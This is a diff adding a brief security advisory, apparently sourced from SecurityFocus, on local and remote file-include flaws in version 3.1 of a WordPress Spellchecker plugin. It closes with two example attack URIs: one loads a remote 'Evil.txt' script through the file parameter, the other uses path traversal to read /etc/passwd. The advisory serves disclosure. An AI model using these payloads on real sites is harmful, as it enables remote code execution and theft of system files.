@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/47317/info
+
+The Spellchecker plugin for WordPress is prone to a local file-include vulnerability and a remote file-include vulnerability because the application fails to sufficiently sanitize user-supplied input.
+
+Exploiting these issues may allow an attacker to execute arbitrary local and remote scripts in the context of the webserver process or obtain potentially sensitive information. This may result in a compromise of the application and the underlying system; other attacks are also possible.
+
+Spellchecker 3.1 is vulnerable; other versions may also be affected. 
+
+The following example URIs are available:
+
+http://www.example.com/general.php?file=http://sitename.com/Evil.txt?
+
+http://www.example.com/general.php?file=../../../../../../../etc/passwd 
